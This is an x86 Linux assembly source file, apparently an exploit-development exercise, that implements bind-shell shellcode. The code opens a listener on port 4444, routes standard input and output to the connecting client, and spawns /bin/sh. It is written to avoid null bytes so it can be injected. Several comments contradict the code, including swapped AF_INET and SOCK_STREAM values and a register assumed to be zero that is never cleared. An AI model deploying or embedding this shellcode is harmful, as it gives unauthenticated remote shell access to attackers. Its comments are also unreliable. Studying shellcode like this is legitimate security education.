; Filename: shell_bind_tcp_asm.asm
; Author: GinVlad
global _start

section .text
_start:
		

	; Make not null character "\00"
	xor eax, eax
	mov ebx, eax

	; esi = edi = 0. Can use like constant

	; Create socket
	; sockfd = socket(AF_INET, SOCK_STREAM, 0);
	mov al, 0x66	; SYS_SOCKETCALL = 102
	mov bl, 0x1		; First argument of socketcall(), ==1 mean SYS_SOCKET
	push esi		; Third argument of socket(AF_INET, SOCK_STREAM, 0)
	push 0x1		; Second argument. SOCK_STREAM == 2
	push 0x2		; First argument. AF_INET == 1. Top of stack == 2
	mov ecx, esp	; Store address of this arguments to ecx
	int 0x80
	mov edx, eax	; Store sockfd to re-use. 

	; Bind
	; bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)); 
	mov al, 0x66	; SYS_SOCKETCALL = 102
	pop ebx			; SYS_BIND == 2, push 2 to ebx. Now top of stack = 1
	; Create (struct sockaddr *) &serv_addr
	;struct sockaddr_in {
    ;           sa_family_t    sin_family; /* address family: AF_INET */
    ;           in_port_t      sin_port;   /* port in network byte order */
    ;           struct in_addr sin_addr;   /* internet address */
    ;       }
    pop ecx					; to make top of stack is 2. sin_addr=0
    push word 0x3905		; port = 4444 . struct.pack("!H",socket.htons(4444)).encode('hex')
    push word 0x2			; AF_INET
    ; Now stack have struct sockaddr_in
    mov ecx, esp			; move address of struct
    ; Push value to arguments of bind()
    push 0x10				; sizeof(serv_addr) == 16 bits
    push ecx				; address of struct sockaddr_in
    push edx				; address of sockfd
    mov ecx, esp			; save address of arguments bind to ecx
    int 0x80				; call sys_bind

    ; Listen
    ; listen(sockfd, 0); 
    mov al, 0x66	; SYS_SOCKETCALL = 102
    mov bl, 0x4		; SYS_LISTEN = 4
    push esi		; Secon arguments
    push edx		; Address of sockfd
    mov ecx, esp	; Store arguments to push in listen
    int 0x80		; Call sys_listen

    ; Accept
    ; clientfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen); /*Accept connection*/
    ; It will be accept(sockfd, 0, 0); Because we still have sockfd
    mov al, 0x66	; SYS_SOCKETCALL = 102
    mov bl, 0x5		; SYS_ACCEPT = 5
    push esi		; Argument 3 = 0
    push esi		; Argument 2 = 0
    push edx		; Argument 1 = &sockfd
    mov ecx, esp	; store to ecx to push sys_accept
    int 0x80		; Call syscall

    ; STDIN, STDOUT, STDERR with dup2()
    ;int dup2(int oldfd, int newfd)
    mov ebx, eax	; return value of sockfd to ebx. this is "int oldfd"
    xor ecx, ecx	; remove x00 in ecx
    mov cl, 0x2	; Create loop from range 0-2. make dup2(ebx, ecx=2), dup2(ebx, ecx=1), dup2(ebx, ecx=0)

loop_dup2:
	mov al, 0x3f	; SYS_CALL of dup2() is 63
	int 0x80		; Call syscall
	dec ecx			; Decrement ecx
	jns loop_dup2	; jump if ZF != 0

	; char *argv[] = {"/bin//sh", NULL}; /*Create pointer have address*/
	; execve(argv[0], &argv[0], 0); /*Call execve*/
	push esi				; NULL
	push dword 0x68732f2f	; //sh
	push dword 0x6e69622f	; /bin
	mov ebx, esp			; store addres argv[] to ebx. Argument 1
	mov al, 0xb				; sys_execve is 11
	mov ecx, esi			; argument 2
	mov edx, esi			; Argument 3
	int 0x80				; call syscall

	
	


